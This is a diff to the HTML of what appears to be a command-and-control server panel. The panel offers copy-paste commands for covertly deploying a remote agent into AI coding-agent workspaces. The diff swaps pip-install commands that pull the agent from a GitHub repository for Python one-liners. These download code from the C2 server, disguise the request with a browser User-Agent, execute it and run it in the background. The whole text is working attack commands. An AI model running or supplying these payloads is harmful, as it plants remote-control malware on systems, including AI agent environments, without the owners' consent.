@@ -438,11 +438,11 @@ python3 /opt/.agent.py &'</div>
   <div class="body">
     <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Agent for Devin AI workspaces. Uses pip install method for stealth.</p>
 
-    <h4 class="section-label">Pip install + run (one command):</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>GITHUB_TOKEN='YOUR_TOKEN' && pip install git+https://${GITHUB_TOKEN}@github.com/GaredBerns/C2_server.git && C2_URL='<span class="srv-url">…</span>' c2-agent &</div>
+    <h4 class="section-label">Direct download from C2 (recommended):</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>C2_URL='<span class="srv-url">…</span>' python3 -c "exec(__import__('urllib.request').urlopen(__import__('urllib.request').Request(f'{C2_URL}/agents/universal.py',headers={'User-Agent':'Mozilla/5.0'})).read())" &</div>
 
-    <h4 class="section-label">Pip install with explicit start:</h4>
-    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>GITHUB_TOKEN='YOUR_TOKEN' && pip install git+https://${GITHUB_TOKEN}@github.com/GaredBerns/C2_server.git -q && C2_URL='<span class="srv-url">…</span>' python3 -c "from src.agents.universal import main; main()" &</div>
+    <h4 class="section-label">One-liner (compact):</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>python3 -c "import os;os.environ['C2_URL']='<span class="srv-url">…</span>';exec(__import__('urllib.request').urlopen(__import__('urllib.request').Request('<span class="srv-url">…</span>/agents/universal.py',headers={'User-Agent':'Mozilla/5.0'})).read())" &</div>
 
     <h4 class="section-label">Inline execution (no pip, direct):</h4>
     <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>C2_URL='<span class="srv-url">…</span>' python3 -c "exec(__import__('urllib.request').urlopen(__import__('urllib.request').Request('<span class="srv-url">…</span>/agents/universal.py',headers={'User-Agent':'Mozilla/5.0'})).read())" &</div>
